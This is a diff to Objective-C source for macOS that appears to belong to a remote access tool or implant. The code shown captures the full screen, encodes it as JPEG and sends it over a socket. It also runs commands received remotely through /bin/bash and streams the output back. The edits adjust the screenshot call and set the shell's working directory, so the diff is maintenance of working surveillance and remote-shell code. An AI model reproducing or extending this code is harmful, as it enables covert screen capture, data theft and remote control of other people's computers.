@@ -656,7 +656,7 @@ int sockfd;
 }
 
 -(void)screenshot {
-    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNullWindowID, kCGWindowImageDefault);
+    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNormalWindowLevel, kCGWindowImageDefault);
     NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
     // Create an NSImage and add the bitmap rep to it...
     NSImage *image = [[NSImage alloc] init];
@@ -667,7 +667,6 @@ int sockfd;
     NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
     NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
     imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
-    
     [self sendString:[NSString stringWithFormat:@"%lu",imageData.length]];
     [self sendFile:imageData];
 }
@@ -726,6 +725,7 @@ int sockfd;
         _systask = [[NSTask alloc] init];
         [_systask setLaunchPath:@"/bin/bash"];
         [_systask setArguments:@[ @"-c", cmd]];
+        [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
         
         NSPipe *stdoutPipe = [NSPipe pipe];
         [_systask setStandardOutput:stdoutPipe];
@@ -742,6 +742,7 @@ int sockfd;
                            [self liveSendString:newOutput];
                            [stdoutHandle waitForDataInBackgroundAndNotify];
                        }];
+        
         
         [_systask launch];
         [_systask waitUntilExit];
